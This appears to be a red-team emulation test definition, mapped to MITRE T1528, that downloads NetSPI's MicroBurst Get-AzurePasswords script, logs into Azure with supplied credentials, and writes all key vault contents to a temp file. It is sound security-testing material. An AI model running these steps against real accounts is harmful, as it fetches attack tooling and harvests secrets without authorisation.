api_version: "2.0"
name: Azure - Dump All Azure Key Vaults with Microburst
description: |-
    Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.
    See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/
args:
    - name: password
      type: string
      default: T1082Az
    - name: output_file
      type: string
      default: $env:temp\T1528Test1.txt
    - name: subscription_id
      type: string
      default: <nil>
    - name: username
      type: string
      default: <nil>
uuid: 1b83cddb-eaa7-45aa-98a5-85fb0a8807ea
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1528: Steal Application Access Token'
requirements:
    platforms:
        - os: iaas:azure
steps:
    - name: |
        The Get-AzurePasswords script must exist in PathToAtomicsFolder\..\ExternalPayloads.
      inline: |
        if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"){exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
        }}
      executor: powershell
    - name: |
        The Azure RM module must be installed.
      inline: |
        try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {{Install-Module -Name AzureRM -Force -allowclobber
        }}} catch {exit 1}
      executor: powershell
    - name: |
        The Azure module must be installed.
      inline: |
        try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {{Install-Module -Name Azure -Force -allowclobber
        }}} catch {exit 1}
      executor: powershell
    - name: azure---dump-all-azure-key-vaults-with-microburst
      inline: |
        import-module "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
        $Password = ConvertTo-SecureString -String "{{.Args.password}}" -AsPlainText -Force
        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.username}}", $Password
        Connect-AzureRmAccount -Credential $Credential
        Get-AzurePasswords -subscription '{{.Args.subscription_id}}' > {{.Args.output_file}}
        cat {{.Args.output_file}}
      executor: powershell
      cleanup:
        inline: |
            remove-item {{.Args.output_file}} -force -erroraction silentlycontinue
        executor: powershell
